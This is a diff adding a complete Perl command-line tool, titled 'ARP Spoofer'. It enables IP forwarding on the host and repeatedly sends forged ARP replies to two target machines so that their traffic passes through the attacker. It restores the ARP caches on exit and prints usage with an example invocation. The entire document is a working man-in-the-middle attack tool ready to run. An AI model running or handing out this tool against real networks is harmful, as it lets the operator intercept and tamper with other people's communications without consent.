@@ -1,0 +1,127 @@
+#!/usr/bin/perl
+use strict;
+use warnings;
+use Net::ARP;
+use Net::Ping;
+use Getopt::Long;
+use Term::ANSIColor;
+
+unless($> == 0) {
+    printcolor("[!!] You need to run this as 'root'\n", 'red');
+    exit 0;
+}
+else {
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+}
+
+my($interface, $target1_ip, $target2_ip, $sleep);
+
+GetOptions(
+    'i=s' => \$interface,
+    't1=s' => \$target1_ip,
+    't2=s' => \$target2_ip,
+    's=i' => \$sleep
+);
+
+&usage() unless $interface;
+&usage() unless $target1_ip;
+&usage() unless $target2_ip;
+
+$sleep = $sleep ? $sleep : 2;
+
+my $local_mac    = Net::ARP::get_mac($interface);
+if($local_mac eq 'unknown') {
+    printcolor("[!!] Unknown local MAC address\n", 'red');
+    exit 0;
+}
+else {
+    printcolor("[*] Local MAC is $local_mac\n", 'magenta');
+}
+my $target1_mac  = &get_mac_addr($target1_ip);
+if($target1_mac eq 'unknown') {
+    printcolor("[!!] Unknown MAC address of Target 1\n", 'red');
+    exit 0;
+}
+
+my $target2_mac   = &get_mac_addr($target2_ip);
+if($target2_mac eq 'unknown') {
+    printcolor("[!!] Unknown MAC address of Target 2\n", 'red');
+    exit 0;
+}
+
+printcolor("[*] Target 1: $target1_ip => $target1_mac\n", 'magenta');
+printcolor("[*] Target 2: $target2_ip => $target2_mac\n", 'magenta');
+
+$SIG{INT} = \&restore_arp;
+
+printcolor("[+] Starting ARP spoofing...\n", 'green');
+printcolor("[+] Ctrl + C to Stop\n", 'green');
+
+while() {
+    printcolor("[==>] Sending $target2_ip: $target1_ip is at $local_mac\n", 'blue');
+    &send_arp($target1_ip,$target2_ip,$local_mac,$target2_mac);
+    printcolor("[==>] Sending $target1_ip: $target2_ip is at $local_mac\n", 'blue');
+    &send_arp($target2_ip,$target1_ip,$local_mac,$target1_mac);
+    printcolor("[zzz] Sleeping for $sleep seconds\n", 'blue');
+    sleep($sleep);
+}
+
+sub send_arp {
+    my $sourceIP        = shift;
+    my $destinationIP   = shift;
+    my $sourceMAC       = shift;
+    my $destinationMAC  = shift;
+
+    unless(Net::ARP::send_packet(
+            $interface,
+            $sourceIP,
+            $destinationIP,
+            $sourceMAC,
+            $destinationMAC,
+            'reply'
+    )) {
+        printcolor("[!!] Exiting...\n", 'red');
+        exit 0;
+    }
+}
+
+sub restore_arp {
+    printcolor("\n[+] Restoring ARP...\n", 'green');
+
+    &send_arp($target1_ip,$target2_ip,$target1_mac,'ff:ff:ff:ff:ff:ff');
+    &send_arp($target2_ip,$target1_ip,$target2_mac,'ff:ff:ff:ff:ff:ff');
+    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
+
+    printcolor("[+] Exiting...\n", 'green');
+    exit 0;
+}
+
+sub get_mac_addr {
+    my $ip = shift;
+    
+    my $ping = Net::Ping->new('icmp');
+    $ping->ping($ip, 2);
+    undef $ping;
+    my $mac = Net::ARP::arp_lookup($interface,$ip);
+
+    return $mac;
+}
+
+sub printcolor {
+    my($text, $color) = @_;
+    print color($color), $text;
+    print color('reset');
+}
+
+sub usage {
+    print "Usage:\n\n\$ sudo perl $0 -i [interface] -t1 [target1 IPv4 addr] -t2 [target2 IPv4 addr]\n\n";
+    print "Options:\n\n";
+    print "\t-i [interface]\t\tnetwork interface\n";
+    print "\t-t1 [IPv4]\t\tfirst target\n";
+    print "\t-t2 [IPv4]\t\tsecond target\n";
+    print "\t-s [seconds]\t\tsleeping time after sending ARP packets\n";
+    print "\nExample:\n\n\$ sudo perl $0 -i eth0 -t1 192.168.8.1 -t2 192.168.8.123 -s 5\n\n";
+    exit 0;
+}
+
+BEGIN { &printcolor("ARP Spoofer\n".'-'x11 ."\n", 'bold blue'); }
